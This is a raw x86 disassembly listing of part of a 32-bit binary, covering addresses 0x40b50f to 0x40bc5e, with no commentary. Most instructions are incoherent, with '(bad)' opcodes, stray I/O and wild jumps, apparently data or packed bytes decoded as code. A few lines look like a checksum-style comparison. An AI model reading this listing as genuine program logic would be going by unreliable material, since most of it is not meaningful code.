  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	cwde   
  40b514:	and    BYTE PTR [esi],ch
  40b516:	push   ss
  40b517:	inc    edi
  40b518:	lea    esp,gs:[eax-0x41]
  40b51c:	repz pop esi
  40b51e:	and    eax,0x278bece0
  40b523:	sub    BYTE PTR [eax],0x53
  40b526:	iret   
  40b527:	mov    eax,ds:0xf7685034
  40b52c:	adc    esi,DWORD PTR [ebx+ecx*4+0x1]
  40b530:	sbb    eax,0x2b8c6781
  40b535:	inc    eax
  40b536:	mov    ah,0xa6
  40b538:	out    0x5e,al
  40b53a:	cmc    
  40b53b:	mov    ch,0x38
  40b53d:	sub    BYTE PTR [eax-0x26],bl
  40b540:	icebp  
  40b541:	std    
  40b542:	ror    BYTE PTR [edx],0x82
  40b545:	sbb    bh,BYTE PTR [eax+0x27512fd2]
  40b54b:	inc    edx
  40b54c:	pop    esi
  40b54d:	pushf  
  40b54e:	jp     0x40b502
  40b550:	mov    dl,0x47
  40b552:	bound  edx,QWORD PTR [edx+0x571768de]
  40b558:	and    DWORD PTR [edi+0x1b],ecx
  40b55b:	sti    
  40b55c:	and    eax,edi
  40b55e:	ret    0xb195
  40b561:	retf   0x6cb
  40b564:	mov    ah,0x10
  40b566:	ficom  WORD PTR [ebp+eax*4+0x6c]
  40b56a:	bnd jb 0x40b53c
  40b56d:	xor    bl,BYTE PTR [esi-0x4675ff9e]
  40b573:	and    ch,ah
  40b575:	pop    edi
  40b576:	cmp    DWORD PTR [ecx],esi
  40b578:	fucom  st(6)
  40b57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b57b:	mov    al,ds:0x3636337f
  40b580:	ja     0x40b574
  40b582:	shr    dl,0x95
  40b585:	mov    ss,WORD PTR [ecx+edi*1]
  40b588:	mov    esi,ebx
  40b58a:	and    ecx,ebx
  40b58c:	mov    ah,0xf
  40b58e:	jecxz  0x40b59a
  40b590:	mov    DWORD PTR [eax],esp
  40b592:	fld    QWORD PTR [esi-0x3926f52d]
  40b598:	xchg   ebx,eax
  40b599:	jbe    0x40b55b
  40b59b:	iret   
  40b59c:	cmp    DWORD PTR [edi],ecx
  40b59e:	inc    eax
  40b59f:	inc    ecx
  40b5a0:	mov    al,ds:0xf285db11
  40b5a5:	outs   dx,DWORD PTR ds:[esi]
  40b5a6:	gs pop esp
  40b5a8:	fidiv  DWORD PTR [edx-0x9d1036f]
  40b5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5af:	in     al,0xed
  40b5b1:	outs   dx,BYTE PTR ds:[esi]
  40b5b2:	xor    DWORD PTR [esi],esp
  40b5b4:	das    
  40b5b5:	mov    BYTE PTR [edi-0x7f],ah
  40b5b8:	imul   DWORD PTR [ecx+0x61]
  40b5bb:	mov    al,ds:0x90ee665c
  40b5c0:	in     eax,0xcd
  40b5c2:	sbb    BYTE PTR [eax],0x9b
  40b5c5:	enter  0x4f1c,0xe1
  40b5c9:	inc    ebp
  40b5ca:	or     DWORD PTR [edi],ecx
  40b5cc:	dec    eax
  40b5cd:	fisttp QWORD PTR [ebp+0x76f09b30]
  40b5d3:	cmp    al,0x4f
  40b5d5:	mov    bh,0x7b
  40b5d7:	xor    BYTE PTR [eax+0x1cbd090f],cl
  40b5dd:	pop    eax
  40b5de:	icebp  
  40b5df:	pop    es
  40b5e0:	mov    BYTE PTR [eax],bh
  40b5e2:	dec    ebx
  40b5e3:	or     eax,0x4075b6f3
  40b5e8:	push   ds
  40b5e9:	mov    ah,0x16
  40b5eb:	fbstp  TBYTE PTR [esp+ecx*8-0x1e820cae]
  40b5f2:	in     al,dx
  40b5f3:	test   DWORD PTR [ecx+0xa3e61ac],eax
  40b5f9:	arpl   ax,bp
  40b5fb:	xchg   esi,eax
  40b5fc:	jp     0x40b64d
  40b5fe:	std    
  40b5ff:	push   esp
  40b600:	fmul   QWORD PTR [edx-0x38]
  40b603:	aad    0x1a
  40b605:	sub    eax,0xe70139b4
  40b60a:	repnz int 0xaf
  40b60d:	mov    dl,0xf
  40b60f:	xchg   esp,eax
  40b610:	pop    eax
  40b611:	sub    bl,BYTE PTR [ebx-0x325c6820]
  40b617:	pop    edx
  40b618:	rol    BYTE PTR [edi+0x54f20181],1
  40b61e:	fnstenv [edi]
  40b620:	and    al,0x7f
  40b622:	enter  0xd1a3,0x14
  40b626:	adc    eax,0x9567482
  40b62b:	jmp    0x7935c894
  40b630:	xor    BYTE PTR [edi-0x5f2feaeb],0xeb
  40b637:	in     al,0xf8
  40b639:	mov    bl,0xd3
  40b63b:	aaa    
  40b63c:	stos   DWORD PTR es:[edi],eax
  40b63d:	scas   al,BYTE PTR es:[edi]
  40b63e:	mov    edi,0xcddc548f
  40b643:	(bad)  
  40b644:	out    0x29,eax
  40b646:	xor    al,0x9a
  40b648:	shr    DWORD PTR [ebp-0x2f],cl
  40b64b:	pop    esp
  40b64c:	inc    esp
  40b64d:	xchg   BYTE PTR [ecx+esi*4-0x414d0642],bh
  40b654:	arpl   di,si
  40b656:	ret    0xf18a
  40b659:	test   al,0x59
  40b65b:	cmp    eax,DWORD PTR [edx+0x55]
  40b65e:	push   0x3b
  40b660:	retf   0x41b8
  40b663:	adc    esi,DWORD PTR [ebp+0x8a34f3b]
  40b669:	add    ecx,ecx
  40b66b:	sub    DWORD PTR [eax+esi*4-0x4d],0xffffff9c
  40b670:	fbstp  TBYTE PTR [edx-0x4c]
  40b673:	xchg   edx,esi
  40b675:	int    0x88
  40b677:	or     eax,0x74bbf9d1
  40b67c:	sub    al,0x2
  40b67e:	addr16 (bad) 
  40b680:	(bad)  
  40b682:	add    edx,esp
  40b684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b685:	mov    esp,0xda5db597
  40b68a:	jne    0x40b6a2
  40b68c:	es mov ebp,0xd987820c
  40b692:	add    eax,0x9a4cc4f3
  40b697:	scas   al,BYTE PTR es:[edi]
  40b698:	push   ss
  40b699:	test   al,0x3f
  40b69b:	test   DWORD PTR [esi+0x27],0x3f277507
  40b6a2:	mov    WORD PTR [ecx-0x66],es
  40b6a5:	ins    DWORD PTR es:[edi],dx
  40b6a6:	push   cs
  40b6a7:	sbb    BYTE PTR [ecx],dl
  40b6a9:	loope  0x40b669
  40b6ab:	jp     0x40b687
  40b6ad:	pop    ds
  40b6ae:	jnp    0x40b6fc
  40b6b0:	add    edx,eax
  40b6b2:	ror    BYTE PTR [ecx+0x21],0xea
  40b6b6:	jmp    0x40b702
  40b6b8:	mov    WORD PTR [ecx+esi*1+0x57c24134],?
  40b6bf:	dec    DWORD PTR ds:0x9e15ecda
  40b6c5:	imul   esp,DWORD PTR [ebx-0x52],0x7
  40b6c9:	shl    BYTE PTR [edx+0x5d216bf3],1
  40b6cf:	push   ebp
  40b6d0:	mov    bl,0xae
  40b6d2:	cdq    
  40b6d3:	pop    eax
  40b6d4:	sbb    BYTE PTR [edi],bh
  40b6d6:	mov    eax,ds:0xd3ea008d
  40b6db:	int3   
  40b6dc:	lods   al,BYTE PTR ds:[esi]
  40b6dd:	(bad)  
  40b6de:	add    ecx,DWORD PTR [ecx]
  40b6e0:	outs   dx,BYTE PTR ds:[esi]
  40b6e1:	lods   al,BYTE PTR ds:[esi]
  40b6e2:	popa   
  40b6e3:	loope  0x40b741
  40b6e5:	ret    0x3725
  40b6e8:	pop    ebp
  40b6e9:	push   ebp
  40b6ea:	or     ecx,DWORD PTR [edx]
  40b6ec:	gs test eax,0x4f336ea0
  40b6f2:	fisubr WORD PTR [edi-0x52a1e512]
  40b6f8:	(bad)  
  40b6f9:	out    0x2a,al
  40b6fb:	and    BYTE PTR [edx],0xa5
  40b6fe:	pop    esi
  40b6ff:	mov    ebx,DWORD PTR [ebx-0x41]
  40b702:	jbe    0x40b735
  40b704:	(bad)  
  40b705:	iret   
  40b706:	sbb    edi,0xffffffdd
  40b709:	shr    DWORD PTR [eax+0x67],1
  40b70c:	out    0x31,ax
  40b70f:	daa    
  40b710:	mov    edx,esi
  40b712:	mov    dh,0xf4
  40b714:	or     dh,BYTE PTR [eax+0xd]
  40b717:	mov    ebx,ecx
  40b719:	imul   ebp,DWORD PTR [ecx+0x1f06dd9e],0x491f1650
  40b723:	loop   0x40b78b
  40b725:	cmp    eax,0x9efc12c2
  40b72a:	(bad)  [edx+0x49]
  40b72d:	sub    al,0xd3
  40b72f:	xchg   edx,eax
  40b730:	test   eax,0x520d18c8
  40b735:	push   ds
  40b736:	and    al,0x35
  40b738:	cmp    DWORD PTR [edx-0x4a2fca69],esp
  40b73e:	dec    ebx
  40b73f:	stos   BYTE PTR es:[edi],al
  40b740:	popf   
  40b741:	sbb    al,0xaf
  40b743:	push   ds
  40b744:	daa    
  40b745:	mul    BYTE PTR [esi]
  40b747:	dec    esp
  40b748:	sbb    ch,dh
  40b74a:	test   dh,ah
  40b74c:	fadd   QWORD PTR [ecx]
  40b74e:	(bad)  
  40b74f:	test   BYTE PTR [ebx+0x15580ae7],dh
  40b755:	popf   
  40b756:	retf   
  40b757:	sbb    edx,DWORD PTR [edx-0x1]
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	mov    ebp,0xb2e9d144
  40b78f:	(bad)  
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	int3   
  40b797:	sbb    al,0xc8
  40b799:	sub    dh,BYTE PTR [edi+ebx*1]
  40b79c:	rcr    ch,cl
  40b79e:	icebp  
  40b79f:	mov    dh,0x93
  40b7a1:	mov    cl,0x8
  40b7a3:	(bad)  
  40b7a4:	popa   
  40b7a5:	add    ecx,edx
  40b7a7:	xchg   BYTE PTR [ecx+0x1d3b7e6e],cl
  40b7ad:	outs   dx,BYTE PTR ds:[esi]
  40b7ae:	pop    ebp
  40b7af:	call   0xfad7:0x7687dd94
  40b7b6:	add    BYTE PTR [ecx+0x381a53b2],ch
  40b7bc:	cmp    al,BYTE PTR [ebp-0x777108ea]
  40b7c2:	mov    eax,0xf2519b70
  40b7c7:	sub    edx,DWORD PTR [edx+0x43]
  40b7ca:	mov    ds:0x8a65b66c,al
  40b7cf:	loop   0x40b75e
  40b7d1:	fisubr DWORD PTR [edi+0x30425a7d]
  40b7d7:	stc    
  40b7d8:	adc    eax,0xc842c135
  40b7dd:	and    esp,DWORD PTR [ecx-0x1d]
  40b7e0:	xchg   edx,eax
  40b7e1:	cdq    
  40b7e2:	add    al,0x53
  40b7e4:	inc    ebx
  40b7e5:	add    al,0xfa
  40b7e7:	jp     0x40b85b
  40b7e9:	mov    bl,0x7c
  40b7eb:	xor    BYTE PTR [eax],cl
  40b7ed:	mov    DWORD PTR [edi+0x7f],0xcbc0641
  40b7f4:	jae    0x40b7e9
  40b7f6:	mov    eax,ds:0x698fe4e2
  40b7fb:	mov    al,ds:0x30217b02
  40b800:	and    DWORD PTR [ecx-0x19d16af8],esp
  40b806:	cld    
  40b807:	pusha  
  40b808:	pop    esp
  40b809:	cmp    dl,BYTE PTR [edx-0x62]
  40b80c:	popf   
  40b80d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b80f:	pop    esp
  40b810:	add    DWORD PTR [ecx+0x770fe525],edi
  40b816:	inc    ecx
  40b817:	mov    ecx,0xea75a393
  40b81c:	jno    0x40b7d7
  40b81e:	and    dh,BYTE PTR [edi]
  40b820:	mov    ah,0xac
  40b822:	fcomp  QWORD PTR [eax+0x22]
  40b825:	add    edi,0xa219c405
  40b82b:	add    al,0xc8
  40b82d:	jmp    0x3059ed55
  40b832:	pop    ebp
  40b833:	int3   
  40b834:	xor    BYTE PTR [esi+esi*1],bl
  40b837:	dec    edx
  40b838:	and    DWORD PTR [edi],ebp
  40b83a:	sub    al,0x81
  40b83c:	sbb    esi,ecx
  40b83e:	push   esp
  40b83f:	jne    0x40b854
  40b841:	jno    0x40b7d6
  40b843:	or     al,bh
  40b845:	retf   0xe995
  40b848:	sbb    bh,BYTE PTR [ebx-0x66]
  40b84b:	add    al,0xf2
  40b84d:	sub    eax,0xc9cf5fac
  40b852:	sub    DWORD PTR [edi+ebx*8-0x629fd61e],ecx
  40b859:	sub    BYTE PTR [ecx+0xe],bl
  40b85c:	popf   
  40b85d:	mov    esp,0x45d5bbb9
  40b862:	mov    eax,ds:0x406ffe17
  40b867:	sub    eax,DWORD PTR [edi-0x3f9039f3]
  40b86d:	push   eax
  40b86e:	mov    al,ds:0x62fff49d
  40b873:	into   
  40b874:	daa    
  40b875:	in     al,dx
  40b876:	outs   dx,BYTE PTR ds:[esi]
  40b878:	test   BYTE PTR [ecx],ah
  40b87a:	shl    DWORD PTR [edi],cl
  40b87c:	into   
  40b87d:	pop    ds
  40b87e:	xsave  [edi-0x5cc185f2]
  40b885:	push   ebx
  40b886:	ja     0x40b8c9
  40b888:	test   DWORD PTR [eax+esi*2-0x27],edx
  40b88c:	sbb    eax,0x2a318b1a
  40b891:	push   0xffffffaa
  40b893:	loopne 0x40b8a5
  40b895:	hlt    
  40b896:	pusha  
  40b897:	inc    eax
  40b898:	pushf  
  40b899:	scas   eax,DWORD PTR es:[edi]
  40b89a:	dec    esp
  40b89b:	lods   al,BYTE PTR ds:[esi]
  40b89c:	push   0xffffff85
  40b89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b89f:	xlat   BYTE PTR ds:[ebx]
  40b8a0:	scas   al,BYTE PTR es:[edi]
  40b8a1:	cwde   
  40b8a2:	lock int3 
  40b8a4:	xor    BYTE PTR [edi],0xd7
  40b8a7:	mov    bl,0x45
  40b8a9:	dec    ecx
  40b8aa:	and    cl,al
  40b8ac:	or     DWORD PTR [eax-0x93d4041],esi
  40b8b2:	test   DWORD PTR [ebx+0x27],esi
  40b8b5:	push   ebx
  40b8b6:	punpckldq mm4,DWORD PTR [ecx+0x21]
  40b8ba:	mov    bh,0xb2
  40b8bc:	data16 (bad) 
  40b8bf:	pop    eax
  40b8c0:	aas    
  40b8c1:	xor    ecx,DWORD PTR ds:0xfab1f125
  40b8c7:	mov    edi,0x37b8dd81
  40b8cc:	mov    ebx,0xebb65b07
  40b8d1:	mov    ah,0x8d
  40b8d3:	rcl    edx,1
  40b8d5:	mov    eax,0xd88c36fc
  40b8da:	sub    BYTE PTR [ecx],dh
  40b8dc:	xchg   BYTE PTR [esi+0x75],al
  40b8df:	jge    0x40b8e0
  40b8e1:	cdq    
  40b8e2:	sar    BYTE PTR [esi],0x1f
  40b8e5:	pop    ebp
  40b8e6:	add    dh,bh
  40b8e8:	or     al,0xf2
  40b8ea:	and    eax,0xeb37e029
  40b8ef:	jmp    0xea07:0xcd39169c
  40b8f6:	mov    ah,0x61
  40b8f8:	sub    bh,bl
  40b8fa:	or     al,0xe4
  40b8fc:	jbe    0x40b8dc
  40b8fe:	mov    dh,0x44
  40b900:	das    
  40b901:	cmp    BYTE PTR [edi],ah
  40b903:	pop    edi
  40b904:	(bad)  
  40b905:	in     al,0xc2
  40b907:	fdivr  st,st(0)
  40b909:	adc    eax,0x6c5ad2cf
  40b90e:	push   eax
  40b90f:	mov    BYTE PTR [edi],dl
  40b911:	pop    ebx
  40b912:	lds    eax,FWORD PTR [edx]
  40b914:	das    
  40b915:	pop    ecx
  40b916:	out    0x93,al
  40b918:	lods   al,BYTE PTR ds:[esi]
  40b919:	mov    edx,0x2eaff79c
  40b91e:	rol    BYTE PTR [ebp+0xf9f4867],cl
  40b924:	cld    
  40b925:	inc    ecx
  40b926:	pop    edi
  40b927:	push   ecx
  40b928:	xchg   esp,eax
  40b929:	hlt    
  40b92a:	or     ebx,edx
  40b92c:	cmp    eax,0x9d690dff
  40b931:	push   ebp
  40b932:	jo     0x40b8f4
  40b934:	xchg   esp,eax
  40b935:	aas    
  40b936:	mov    al,ds:0xfc9e23f5
  40b93b:	je     0x40b900
  40b93d:	jmp    0x1a5e4731
  40b942:	jo     0x40b913
  40b944:	(bad)  
  40b945:	je     0x40b90a
  40b947:	pusha  
  40b948:	popf   
  40b949:	lods   eax,DWORD PTR ds:[esi]
  40b94a:	out    0x7b,al
  40b94c:	and    BYTE PTR [ecx-0xe],dl
  40b94f:	xchg   ebx,eax
  40b950:	mov    ecx,0x7f1fdc5a
  40b955:	dec    edx
  40b956:	lods   eax,DWORD PTR ds:[esi]
  40b957:	lods   eax,DWORD PTR ds:[esi]
  40b958:	scas   al,BYTE PTR es:[edi]
  40b959:	mov    ch,al
  40b95b:	js     0x40b911
  40b95d:	mov    ebp,0x409081cf
  40b962:	or     BYTE PTR [edi+0x42],dh
  40b965:	pop    esi
  40b966:	pop    edx
  40b967:	sub    BYTE PTR [ecx+0x63],ah
  40b96a:	xchg   edi,eax
  40b96b:	dec    esp
  40b96c:	in     eax,0xd9
  40b96e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96f:	gs loope 0x40b989
  40b972:	loop   0x40b934
  40b974:	lahf   
  40b975:	push   eax
  40b976:	add    eax,0xc71cec16
  40b97b:	adc    edx,DWORD PTR [ebp-0x4ae5bd70]
  40b981:	fcmovu st,st(1)
  40b983:	sbb    bh,BYTE PTR [edx-0x67]
  40b986:	cwde   
  40b987:	cmp    cl,bl
  40b989:	out    dx,al
  40b98a:	or     bh,BYTE PTR [ebx-0x71966533]
  40b990:	pop    esp
  40b991:	sub    esi,ebp
  40b993:	rol    dl,cl
  40b995:	ret    
  40b996:	inc    esp
  40b997:	pushf  
  40b998:	clc    
  40b999:	sub    eax,0x3cb7c9ed
  40b99e:	mov    BYTE PTR [ecx],0x57
  40b9a1:	pop    edx
  40b9a2:	adc    ebx,DWORD PTR [eax]
  40b9a4:	jae    0x40b983
  40b9a6:	inc    eax
  40b9a7:	retf   
  40b9a8:	loop   0x40b98f
  40b9aa:	xchg   al,dh
  40b9ac:	in     al,0x2f
  40b9ae:	and    eax,0x93369299
  40b9b3:	loopne 0x40b9e8
  40b9b5:	scas   eax,DWORD PTR es:[edi]
  40b9b6:	and    eax,0x7254d2f5
  40b9bb:	inc    ebx
  40b9bc:	ja     0x40b9a1
  40b9be:	loope  0x40ba36
  40b9c0:	add    al,0xfb
  40b9c2:	lock (bad) 
  40b9c4:	cmp    DWORD PTR [eax],edi
  40b9c6:	mov    bl,0x25
  40b9c8:	pop    edx
  40b9c9:	inc    ebx
  40b9ca:	gs inc edx
  40b9cc:	imul   esi,ecx,0xffffffdf
  40b9cf:	pop    ss
  40b9d0:	adc    al,0xf8
  40b9d2:	mov    ebp,0xbebd8c98
  40b9d7:	cmp    dl,BYTE PTR [eax-0x741979fb]
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x5eda57f8],eax
  40ba0f:	mov    ecx,0x7efd7cca
  40ba14:	jle    0x40ba4e
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40ba7b
  40ba1a:	imul   ebp,DWORD PTR [ebx],0x73904ab1
  40ba20:	in     al,dx
  40ba21:	fcomp  DWORD PTR [edx+ecx*8+0x77b531f6]
  40ba28:	sbb    esi,edi
  40ba2a:	dec    eax
  40ba2b:	and    eax,0x50e45fda
  40ba30:	xchg   ebp,eax
  40ba31:	leave  
  40ba32:	cmc    
  40ba33:	dec    esi
  40ba34:	sahf   
  40ba35:	mov    al,ds:0x9d65609d
  40ba3a:	adc    eax,0xc804226b
  40ba3f:	and    esi,0x53bb80a2
  40ba45:	dec    ebx
  40ba46:	test   dh,dh
  40ba48:	dec    ebx
  40ba49:	mov    ebx,0x28096ecd
  40ba4e:	pop    es
  40ba4f:	sbb    BYTE PTR [edi-0x1a],0x89
  40ba53:	mov    esp,edx
  40ba55:	std    
  40ba56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba57:	mov    ah,0xe6
  40ba59:	push   esp
  40ba5a:	repz sub eax,0xb62cb475
  40ba60:	test   al,0x6d
  40ba63:	aad    0x67
  40ba65:	bound  edx,QWORD PTR [ecx]
  40ba67:	das    
  40ba68:	add    eax,0x15d6bb96
  40ba6d:	lock test BYTE PTR [edi-0x45],bh
  40ba71:	retf   0x4f71
  40ba74:	(bad)  
  40ba75:	add    eax,0xdb66dfac
  40ba7a:	js     0x40bae9
  40ba7c:	sar    BYTE PTR [ecx],0x20
  40ba7f:	fdiv   DWORD PTR [edx-0x4c826073]
  40ba85:	outs   dx,BYTE PTR ds:[esi]
  40ba86:	cld    
  40ba87:	adc    al,0x24
  40ba89:	imul   ebp,DWORD PTR [ecx+0x8],0xffffffe9
  40ba8d:	iret   
  40ba8e:	jg     0x40ba84
  40ba90:	imul   ebp,esi,0xffffff82
  40ba93:	inc    eax
  40ba94:	imul   eax,DWORD PTR [ecx-0x1d258479],0xe04eda94
  40ba9e:	push   edx
  40ba9f:	fwait
  40baa0:	jmp    0x40ba75
  40baa2:	xchg   ah,bh
  40baa4:	cs cld 
  40baa6:	pop    edi
  40baa7:	push   ebx
  40baa8:	ins    BYTE PTR es:[edi],dx
  40baa9:	or     DWORD PTR [eax-0x22fceab8],esi
  40baaf:	test   al,0xe9
  40bab1:	sub    ch,bl
  40bab3:	sub    ch,BYTE PTR [ebp-0x1c1bee9e]
  40bab9:	std    
  40baba:	push   ebp
  40babb:	(bad)  
  40babc:	sti    
  40babd:	pop    ds
  40babe:	call   DWORD PTR [ebp-0x32]
  40bac1:	pop    esi
  40bac2:	dec    edi
  40bac3:	out    dx,al
  40bac4:	mov    al,0x28
  40bac6:	inc    ebx
  40bac7:	outs   dx,DWORD PTR ds:[esi]
  40bac8:	or     al,0x3
  40baca:	xchg   ecx,eax
  40bacb:	jl     0x40bb33
  40bacd:	mov    ds:0x99d50b6f,al
  40bad2:	test   BYTE PTR [edi-0xf],dl
  40bad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad6:	jnp    0x40ba64
  40bad8:	(bad)  
  40bad9:	addr16 inc ebx
  40badb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40badc:	ins    BYTE PTR es:[edi],dx
  40badd:	dec    esi
  40bade:	aas    
  40badf:	push   ss
  40bae0:	in     eax,0xe5
  40bae2:	push   es
  40bae3:	push   ecx
  40bae4:	rcr    BYTE PTR [edx-0x663cea05],1
  40baea:	aad    0x78
  40baec:	dec    ecx
  40baed:	pushf  
  40baee:	push   ebx
  40baef:	imul   ecx,DWORD PTR [ebp+0x59],0xffffffcf
  40baf3:	popf   
  40baf4:	adc    al,0x8c
  40baf6:	inc    ecx
  40baf7:	pop    ss
  40baf8:	outs   dx,BYTE PTR ds:[esi]
  40baf9:	sub    eax,DWORD PTR [ecx]
  40bafb:	cmp    DWORD PTR [eax+ebx*2+0x699e25a0],0x35
  40bb03:	xor    al,0x23
  40bb05:	push   ecx
  40bb06:	adc    DWORD PTR [esi-0x4d],esp
  40bb09:	sbb    edi,DWORD PTR [ebx+0x40]
  40bb0c:	jecxz  0x40bb7d
  40bb0e:	sub    ebx,ebx
  40bb10:	cmc    
  40bb11:	cwde   
  40bb12:	push   eax
  40bb13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb14:	adc    al,0x6d
  40bb16:	jbe    0x40bab2
  40bb18:	jmp    0xc0e18fb7
  40bb1d:	test   DWORD PTR [ebx],0x92aaa937
  40bb23:	das    
  40bb24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb25:	cmc    
  40bb26:	inc    esi
  40bb27:	test   al,0xb0
  40bb29:	sbb    dl,bh
  40bb2b:	cmp    ebp,DWORD PTR [ecx]
  40bb2d:	ret    0x6129
  40bb30:	push   ss
  40bb31:	dec    esi
  40bb32:	or     DWORD PTR [esi],edi
  40bb34:	daa    
  40bb35:	ror    BYTE PTR [esi+0x71],1
  40bb38:	push   di
  40bb3a:	aas    
  40bb3b:	sub    al,0xbc
  40bb3d:	inc    ecx
  40bb3e:	jnp    0x40bb04
  40bb40:	push   cs
  40bb41:	mov    ebx,0x16b14bd2
  40bb46:	sar    BYTE PTR [ebp-0x6a0dc7e5],cl
  40bb4c:	je     0x40bbc6
  40bb4e:	mov    cl,0x66
  40bb50:	add    BYTE PTR [ebx],al
  40bb52:	cmp    DWORD PTR [eax-0x21],0xad1bb4bb
  40bb59:	adc    esi,DWORD PTR [edx]
  40bb5b:	mov    WORD PTR [ecx],ds
  40bb5d:	mov    cl,0x69
  40bb5f:	adc    eax,DWORD PTR [eax-0x3f63a49b]
  40bb65:	mov    ecx,0xd0cfe6cd
  40bb6a:	cmp    dh,BYTE PTR [ebp+0x10]
  40bb6d:	lods   eax,DWORD PTR ds:[esi]
  40bb6e:	rol    BYTE PTR [esi],cl
  40bb70:	fdiv   QWORD PTR [ecx+0x6]
  40bb73:	pop    edi
  40bb74:	les    edx,FWORD PTR ds:0xb2e0772d
  40bb7a:	or     eax,0xc74aa8bd
  40bb7f:	cmp    ah,BYTE PTR [ecx]
  40bb81:	int    0xe
  40bb83:	push   esp
  40bb84:	stos   BYTE PTR es:[edi],al
  40bb85:	(bad)  
  40bb86:	data16 fwait
  40bb88:	test   eax,0x2eca0216
  40bb8d:	mov    ds:0xb17910b,al
  40bb92:	out    dx,al
  40bb93:	push   esi
  40bb94:	adc    ah,BYTE PTR [edx-0x3d7680cd]
  40bb9a:	cli    
  40bb9b:	mov    dl,0x9b
  40bb9d:	loope  0x40bbb2
  40bb9f:	dec    ecx
  40bba0:	pcmpgtb mm2,QWORD PTR [ecx]
  40bba3:	imul   esi,edx,0x458f7948
  40bba9:	mov    bh,0x81
  40bbab:	sub    ch,dh
  40bbad:	pop    edx
  40bbae:	scas   eax,DWORD PTR es:[edi]
  40bbaf:	mov    dh,0x42
  40bbb1:	jb     0x40bb74
  40bbb3:	and    bh,BYTE PTR [ecx-0x1a]
  40bbb6:	jno    0x40bbc2
  40bbb8:	scas   eax,DWORD PTR es:[edi]
  40bbb9:	cmc    
  40bbba:	dec    eax
  40bbbb:	sbb    eax,0xafec3e6e
  40bbc0:	mov    ds:0xd01fdebc,eax
  40bbc5:	push   edi
  40bbc6:	cmc    
  40bbc7:	and    eax,0xa3eb1374
  40bbcc:	(bad)  
  40bbcd:	repnz in eax,dx
  40bbcf:	pop    ebx
  40bbd0:	out    0x27,eax
  40bbd2:	int    0x8b
  40bbd4:	mov    al,0x9d
  40bbd6:	adc    BYTE PTR [edx+0x48],bl
  40bbd9:	cmp    BYTE PTR [ebp+0x16],bh
  40bbdc:	xchg   ebx,eax
  40bbdd:	out    0x40,eax
  40bbdf:	(bad)  
  40bbe0:	fild   QWORD PTR [ebp-0x10]
  40bbe3:	dec    esp
  40bbe4:	cmp    BYTE PTR [eax+0x3037eb0e],dl
  40bbea:	in     al,dx
  40bbeb:	xor    DWORD PTR [edx],esp
  40bbed:	into   
  40bbee:	or     BYTE PTR [esi+0x19],0xf3
  40bbf2:	nop
  40bbf3:	push   cs
  40bbf4:	es xchg edi,eax
  40bbf6:	loope  0x40bbfc
  40bbf8:	mov    ch,dl
  40bbfa:	cwde   
  40bbfb:	jnp    0x40bbed
  40bbfd:	inc    esi
  40bbfe:	addr16 (bad) 
  40bc00:	pop    eax
  40bc01:	push   ebx
  40bc02:	dec    ecx
  40bc03:	inc    ebx
  40bc04:	clc    
  40bc05:	mov    ebp,0xae660868
  40bc0a:	fwait
  40bc0b:	int    0x8c
  40bc0d:	push   eax
  40bc0e:	xchg   edx,eax
  40bc0f:	adc    DWORD PTR [eax+0x1181086f],esp
  40bc15:	push   0xffffffe3
  40bc17:	cmp    BYTE PTR [ebx],bh
  40bc19:	sub    DWORD PTR [eax+0x5bee7e62],0x4b29e544
  40bc23:	cmp    eax,0x9bef4752
  40bc28:	pop    eax
  40bc29:	or     al,0xb1
  40bc2b:	mov    al,0x69
  40bc2d:	dec    edx
  40bc2e:	aaa    
  40bc2f:	inc    ebx
  40bc30:	xchg   esp,eax
  40bc31:	pop    ebx
  40bc32:	xor    DWORD PTR [eax-0x25],esp
  40bc35:	test   eax,0x57d82ae1
  40bc3a:	or     eax,0x8d75b55c
  40bc3f:	lods   al,BYTE PTR ds:[esi]
  40bc40:	clc    
  40bc41:	and    ah,BYTE PTR fs:[esi]
  40bc44:	add    bh,cl
  40bc46:	push   cs
  40bc47:	or     eax,edx
  40bc49:	out    0x75,eax
  40bc4b:	mov    ch,0x1
  40bc4d:	pusha  
  40bc4e:	push   cs
  40bc4f:	mov    edi,0x32296fb4
  40bc54:	sbb    esi,DWORD PTR [edi]
  40bc56:	test   al,0x20
  40bc58:	sti    
  40bc59:	add    BYTE PTR [ebp+0x2f],dl
  40bc5c:	ficom  DWORD PTR [ecx]
  40bc5e:	or     DWORD PTR [edi],0x8b7804b7
